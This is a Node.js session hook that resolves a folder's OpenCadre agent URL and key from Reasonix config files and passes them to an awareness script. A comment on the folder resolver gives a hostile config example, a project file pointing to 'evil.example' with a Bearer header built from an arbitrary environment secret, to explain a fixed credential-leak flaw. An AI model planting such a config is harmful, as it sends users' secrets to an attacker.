#!/usr/bin/env node
// Folder-aware OpenCadre session hook for Reasonix. Zero dependencies, Node 20+.
//
// Reasonix prefers ./reasonix.toml over the machine-wide config, so a session's identity depends on
// the folder it runs in. A hook that resolved the key from one shared place would brief every session
// as the SAME agent — i.e. impersonate the folder's agent. This wrapper resolves the opencadre entry
// exactly the way Reasonix does, exports it, and hands the hook payload to the shared awareness
// script, so a session is always briefed as the agent its MCP server actually is.
//
// Resolution order (same as Reasonix: nearest file wins):
//   1. the nearest reasonix.toml at or above the session's cwd that has an opencadre [[plugins]] block
//   2. the machine-wide <Reasonix home>/config.toml, with ${VAR} filled from its .env
//   3. neither -> silent, so a folder with no OpenCadre stays untouched
//
// Installed once, machine-wide (<Reasonix home>/settings.json), so it covers every folder.
// stdout carries only the awareness script's output. A key is never printed; any failure is silent.
//
//   node scripts/reasonix-opencadre-hook.mjs   # reads the hook payload JSON on stdin, like the
//                                              # skills/opencadre-awareness.mjs it wraps
//
// env: REASONIX_HOME  Reasonix home holding config.toml + .env (default: %APPDATA%\Reasonix on
//                     Windows, else ~/.config/reasonix or the legacy ~/.reasonix - the same order,
//                     from the same function, that the config reader walks)

import { spawnSync } from "node:child_process";
import { existsSync, readFileSync } from "node:fs";
import { homedir } from "node:os";
import { dirname, join, parse, resolve } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
// ONE TOML reader, imported rather than copied. This file used to carry its own, and the two had
// already DIVERGED: this one matched `name = "opencadre"` anywhere in the block and required a url,
// while the shared reader anchors the name to its own line and defaults a missing url to the public
// hub. Two implementations of the thing that decides an agent's identity is how a session gets
// briefed as one agent and woken as another, so the hook adopts the reader's semantics.
// It returns { url, key }; this file works in { hub, key } with /mcp already stripped, so the
// callsites translate - that shape difference is the only reason this is not a straight swap.
import { projectExpand, reasonixPlugin, reasonixRoots } from "./opencadre-config.mjs";

const AWARENESS = fileURLToPath(new URL("../examples/hooks/opencadre-awareness.mjs", import.meta.url));

/** Reasonix home: explicit override first, then the platform default.
 *
 * The win32 arm keys on the PLATFORM ALONE. It used to read `win32 && env.APPDATA`, and that
 * conjunction was a bug: with APPDATA unset the guard went false, the win32 arm was skipped, and
 * control fell through into the POSIX existence-probe loop below - whose first candidate is
 * ~/.reasonix. On a box where ~/.reasonix exists but holds no config (measurably the case here:
 * the real config lives in %APPDATA%\Reasonix and ~/.reasonix holds only `locks/`), the folder
 * fallback then looked for a config.toml that was never there and silently briefed nothing.
 *
 * APPDATA is normally set on Windows, which is why this never showed up: the guard was only wrong
 * on the path nobody walks. `||` keeps the unset case on a Windows path instead of a POSIX one.
 *
 * Pinned by tests/awareness-hook.test.ts, which runs the same tree twice with only APPDATA
 * differing.
 *
 * EXPORTED because scripts/reasonix-agents.mjs compares a folder's resolver `source` against this
 * SAME home to decide whether that folder inherited the machine-wide agent. It used to carry its
 * own copy of this rule, and a copy that drifted would not error - it would make the check report
 * nothing inherited, silently. Sharing the function makes the resolver and the check structurally
 * incapable of disagreeing.
 *
 * ONE rule, not two. reasonixRoots() (opencadre-config.mjs) owns the ORDER - REASONIX_HOME, else the
 * platform default, else the POSIX candidate list XDG-first - and this derives the single home from
 * it: the first candidate that EXISTS, else the first candidate. This function used to carry its own
 * copy of the rule, taking the first existing of ~/.reasonix then ~/.config/reasonix - the LEGACY
 * order first, the opposite of the reader's. On a box holding both directories the hook therefore
 * briefed from ~/.reasonix while the reader resolved ~/.config/reasonix, and the
 * inheritance check in reasonix-agents.mjs exists to catch exactly that - but it compared a home it
 * derived itself against one this file derived, so the two agreed only for as long as the copies
 * happened to match, and the divergence was the one thing the check could not see.
 *
 * The existence probe is why this is not a bare reasonixRoots()[0]: a POSIX install holding only the
 * legacy ~/.reasonix would otherwise resolve to ~/.config/reasonix, which does not exist there, and
 * the machine-wide briefing would silently find no config at all. Probing keeps a legacy-only install
 * working while making the order canonical wherever both exist.
 *
 * The lock doctor is NOT a third copy - lockRoots() consumes reasonixRoots() for its config-side root
 * and adds the lock-family list, which is a different question. */
export function reasonixHome(home = homedir(), env = process.env, platform = process.platform) {
  const roots = reasonixRoots(home, env, platform);
  return roots.find((root) => existsSync(root)) ?? roots[0];
}

// The TOML reader that used to live here was deleted in favour of the shared reasonixPlugin()
// imported at the top. Keeping ONE copy is the whole point: these two had already diverged in both
// how they matched the plugin name and how they treated a missing url, and only one of them can be
// the thing that decides an agent's identity.

/** .env lines as a lookup; values keep everything after the first "=". */
function envFile(file) {
  let text = "";
  try {
    text = readFileSync(file, "utf8");
  } catch {
    return () => undefined;
  }
  const map = new Map();
  for (const line of text.split(/\r?\n/)) {
    const m = line.match(/^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*)$/);
    if (m) map.set(m[1], m[2].trim().replace(/^(["'])(.*)\1$/, "$2"));
  }
  return (name) => map.get(name);
}

/** Nearest reasonix.toml at or above `dir` with an opencadre block, else the machine-wide config.
 *
 * Both lookups go through the SHARED reader, whose { url, key } is translated here into this file's
 * { hub, key } (with /mcp stripped) - the shape difference is the only reason this is not a plain
 * swap. The expand function is supplied per file because only the caller knows where a ${VAR} is
 * defined: the process environment for a project file, and Reasonix home's .env for the
 * machine-wide one.
 *
 * The PROJECT lookup's expand is wrapped in projectExpand(), and that wrap is the fix rather than
 * tidiness. This call used to hand the reader a bare `(name) => process.env[name]`, so a repository
 * the user had merely cloned chose both the host its Bearer token was sent to AND which of the
 * machine's environment variables became that token: a folder holding only `url =
 * "https://evil.example/mcp"` and `Authorization = "Bearer ${ANY_SECRET}"` was briefed as an agent
 * of evil.example, carrying ANY_SECRET's real value. The machine-wide config below is NOT wrapped -
 * it is this tool's own install and legitimately expands its own local names. */
export function resolveFolderAgent(cwd, home = reasonixHome()) {
  let dir = resolve(cwd);
  const { root } = parse(dir);
  for (;;) {
    const file = join(dir, "reasonix.toml");
    if (existsSync(file)) {
      const found = reasonixPlugin(readFileSync(file, "utf8"), projectExpand((name) => process.env[name]));
      if (found) return { hub: found.url.replace(/\/mcp$/, ""), key: found.key, source: file };
    }
    if (dir === root) break;
    const up = dirname(dir);
    if (up === dir) break;
    dir = up;
  }
  const global = join(home, "config.toml");
  if (existsSync(global)) {
    const fromEnvFile = envFile(join(home, ".env"));
    // Process env wins over .env, matching how Reasonix expands ${VAR} in its own config.
    const found = reasonixPlugin(readFileSync(global, "utf8"), (name) => process.env[name] ?? fromEnvFile(name));
    if (found) return { hub: found.url.replace(/\/mcp$/, ""), key: found.key, source: global };
  }
  return null;
}

// Reasonix and Claude Code send the SAME hook events under DIFFERENT key names, and the shared
// awareness script below speaks Claude Code's. Observed from a real payload (a SessionStart dump):
//   {"event":"SessionStart","sessionId":"20260917-…","cwd":"C:\\…","source":"startup"}
// A script reading hook_event_name/session_id gets undefined and goes SILENT - which is how these
// hooks ran doing nothing at all, with no error to notice. Translate, never assume the alias.
function toClaudeCodePayload(raw) {
  let payload;
  try {
    payload = JSON.parse(raw || "{}");
  } catch {
    return { payload: null, json: raw };
  }
  const event = payload.event ?? payload.hook_event_name;
  const sessionId = payload.sessionId ?? payload.session_id;
  // Spread first so an unknown future field survives; the translated keys then win outright.
  const json = JSON.stringify({ ...payload, hook_event_name: event, session_id: sessionId });
  return { payload, json };
}

function main() {
  const raw = readFileSync(0, "utf8");
  const { payload, json } = toClaudeCodePayload(raw);
  // A payload cwd that is not a directory we can walk (odd encoding, a stale path, a wrong shape)
  // would resolve to nothing and silently skip the briefing. Prefer process.cwd() in that case.
  let cwd = process.cwd();
  if (payload && typeof payload.cwd === "string" && payload.cwd && existsSync(payload.cwd)) cwd = payload.cwd;
  const agent = resolveFolderAgent(cwd);
  if (!agent) return; // No OpenCadre in this folder: stay silent rather than guess an identity.

  const result = spawnSync(process.execPath, [AWARENESS, ...process.argv.slice(2)], {
    input: json,
    env: { ...process.env, OPENCADRE_URL: agent.hub, OPENCADRE_KEY: agent.key },
    encoding: "utf8",
    windowsHide: true,
  });
  if (result.stdout) process.stdout.write(result.stdout);
  if (result.stderr) process.stderr.write(result.stderr);
  process.exitCode = result.status ?? 0;
}

// pathToFileURL, not a hand-built file:// string: only it maps C:\x to file:///C:/x on Windows.
const isMain = process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href;
if (isMain) main();
